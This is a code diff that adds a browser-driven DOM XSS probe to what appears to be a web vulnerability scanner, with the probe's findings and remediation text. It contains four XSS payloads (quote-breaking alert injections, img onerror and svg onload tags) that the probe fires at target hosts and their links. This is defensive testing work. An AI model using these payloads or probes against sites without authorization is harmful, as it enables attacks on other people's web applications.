@@ -1055,6 +1055,238 @@ async def run_reflected_xss_probe(
 
 
 # ═══════════════════════════════════════════════════════════════════════
+# DOM XSS Probe — Playwright-based browser verification
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Complements the HTTP-based reflected XSS probe by using an actual
+# browser to detect DOM-based XSS where:
+#   1. The payload is consumed only by client-side JavaScript
+#   2. The payload propagates through navigation (click a link → sub-page
+#      JS reads location.search → alert fires)
+#
+# This replicates the manual pentester workflow:
+#   visit root?key=payload → click link → observe alert() popup
+
+_DOM_XSS_PAYLOADS: list[tuple[str, str]] = [
+    ("js_squote_break", "x%27)-alert(79135)-(%27"),
+    ("js_dquote_break", 'x%22)-alert(79135)-(%22'),
+    ("html_img", "%3Cimg%20src=x%20onerror=alert(79135)%3E"),
+    ("html_svg", "%3Csvg%20onload=alert(79135)%3E"),
+]
+
+_DOM_XSS_ALERT_MARKER = "79135"
+
+
+async def run_dom_xss_probe(
+    browser,
+    hosts: list[str],
+    crawled_urls: Iterable[str] = (),
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Use Playwright to detect DOM XSS by navigating with payloads and
+    catching alert() dialogs.  Covers param propagation through link clicks."""
+
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda *a, **kw: None)
+
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in crawled_urls:
+        try:
+            h = urlparse(curl).netloc.split(":")[0].lower()
+            _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            pass
+
+    for host in hosts:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+
+        base_url = f"https://{host}"
+        _progress("active_baseline_step", {
+            "host": host, "step": "dom_xss_start",
+        })
+
+        # Collect HTML sub-pages to test (skip static assets)
+        _static_exts = ('.js', '.css', '.png', '.jpg', '.gif', '.svg',
+                        '.woff', '.woff2', '.ttf', '.ico', '.map',
+                        '.xml', '.json', '.pbf')
+        seed_pages = [base_url]
+        for curl in _crawled_by_host.get(host, [])[:30]:
+            if not any(curl.lower().endswith(e) for e in _static_exts):
+                cp = urlparse(curl)
+                page_base = f"{cp.scheme}://{cp.netloc}{cp.path or '/'}"
+                if page_base not in seed_pages:
+                    seed_pages.append(page_base)
+
+        # Discover params from seed pages using the same regex
+        params_to_test: set[str] = set()
+        for sp in seed_pages[:5]:
+            try:
+                context = await browser.new_context(
+                    ignore_https_errors=True, java_script_enabled=True)
+                pg = await context.new_page()
+                await pg.goto(sp, wait_until="domcontentloaded", timeout=15000)
+                html = await pg.content()
+                for m in _re.finditer(
+                    r'[?&]([A-Za-z_][A-Za-z0-9_-]{0,40})=', html):
+                    params_to_test.add(m.group(1).lower())
+                await context.close()
+            except Exception:
+                try:
+                    await context.close()
+                except Exception:
+                    pass
+
+        if not params_to_test:
+            params_to_test = {"key", "q", "search", "id", "style"}
+
+        _progress("active_baseline_step", {
+            "host": host, "step": "dom_xss_params",
+            "count": len(params_to_test),
+            "params": sorted(params_to_test)[:20],
+        })
+
+        # For each param × payload, navigate and check for alert()
+        for param in sorted(params_to_test)[:10]:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+
+            for payload_label, payload in _DOM_XSS_PAYLOADS:
+                _alert_fired = False
+                _alert_text = ""
+                _trigger_url = ""
+
+                try:
+                    context = await browser.new_context(
+                        ignore_https_errors=True, java_script_enabled=True)
+                    pg = await context.new_page()
+
+                    def _on_dialog(dialog):
+                        nonlocal _alert_fired, _alert_text
+                        if _DOM_XSS_ALERT_MARKER in (dialog.message or ""):
+                            _alert_fired = True
+                            _alert_text = dialog.message
+                        asyncio.ensure_future(dialog.accept())
+
+                    pg.on("dialog", _on_dialog)
+
+                    # Step 1: Navigate to root page with payload
+                    root_url = f"{base_url}?{param}={payload}"
+                    await pg.goto(root_url, wait_until="domcontentloaded",
+                                  timeout=15000)
+                    await asyncio.sleep(1.5)
+
+                    if _alert_fired:
+                        _trigger_url = root_url
+                    else:
+                        # Step 2: Click all <a> links on the page
+                        link_count = await pg.evaluate(
+                            "() => document.querySelectorAll('a[href]').length")
+                        for i in range(min(link_count or 0, 15)):
+                            if _alert_fired:
+                                break
+                            try:
+                                await pg.evaluate(
+                                    f"() => document.querySelectorAll('a[href]')[{i}].click()")
+                                await asyncio.sleep(2.0)
+                                if _alert_fired:
+                                    _trigger_url = pg.url
+                                    break
+                                await pg.go_back(wait_until="domcontentloaded",
+                                                 timeout=5000)
+                                await asyncio.sleep(0.5)
+                            except Exception:
+                                try:
+                                    await pg.goto(
+                                        root_url,
+                                        wait_until="domcontentloaded",
+                                        timeout=10000)
+                                    await asyncio.sleep(1.0)
+                                except Exception:
+                                    break
+
+                    # Step 3: Also test sub-pages directly
+                    if not _alert_fired:
+                        for sp in seed_pages[1:6]:
+                            if _alert_fired:
+                                break
+                            try:
+                                sep = "&" if "?" in sp else "?"
+                                sub_url = f"{sp}{sep}{param}={payload}"
+                                await pg.goto(
+                                    sub_url,
+                                    wait_until="domcontentloaded",
+                                    timeout=10000)
+                                await asyncio.sleep(2.0)
+                                if _alert_fired:
+                                    _trigger_url = sub_url
+                            except Exception:
+                                continue
+
+                    await context.close()
+                except Exception as e:
+                    logger.debug("DOM XSS probe error: %s", e)
+                    try:
+                        await context.close()
+                    except Exception:
+                        pass
+                    continue
+
+                if _alert_fired:
+                    f = {
+                        "title": (
+                            f"DOM-Based XSS via '{param}' Parameter "
+                            f"(Browser-Verified)"
+                        ),
+                        "severity": "Critical",
+                        "confidence": "Confirmed",
+                        "owasp_category": "A03:2021",
+                        "cwe": "CWE-79",
+                        "url": _trigger_url or root_url,
+                        "parameter": param,
+                        "payload": payload,
+                        "evidence": (
+                            f"Playwright browser navigated to page with "
+                            f"?{param}={payload} and detected a JavaScript "
+                            f"alert() dialog containing '{_alert_text}'. "
+                            f"This confirms DOM-based XSS where client-side "
+                            f"JavaScript reads the parameter from "
+                            f"location.search and injects it into a "
+                            f"dangerous sink without sanitization."
+                        ),
+                        "remediation": (
+                            "Sanitize all values read from location.search, "
+                            "location.hash, document.referrer and other DOM "
+                            "sources before passing them to dangerous sinks "
+                            "(innerHTML, eval, document.write, script src). "
+                            "Use textContent instead of innerHTML. Deploy a "
+                            "strict Content-Security-Policy."
+                        ),
+                        "phase": "Active Baseline (DOM XSS)",
+                        "tool": "active_baseline.dom_xss_probe",
+                        "_finding_source": "active_baseline",
+                        "_payload_label": payload_label,
+                        "_xss_context": "dom_xss_browser_verified",
+                    }
+                    findings.append(f)
+                    _emit(f)
+                    _progress("active_baseline_step", {
+                        "host": host, "step": "dom_xss_confirmed",
+                        "param": param, "payload_label": payload_label,
+                        "trigger_url": _trigger_url or root_url,
+                    })
+                    break  # One confirmed payload per param is enough
+
+    _progress("active_baseline_end", {
+        "probe": "dom_xss", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
 # GAP 4 — SSRF Bypass Probe (Dynamic Discovery)
 # ═══════════════════════════════════════════════════════════════════════
 #
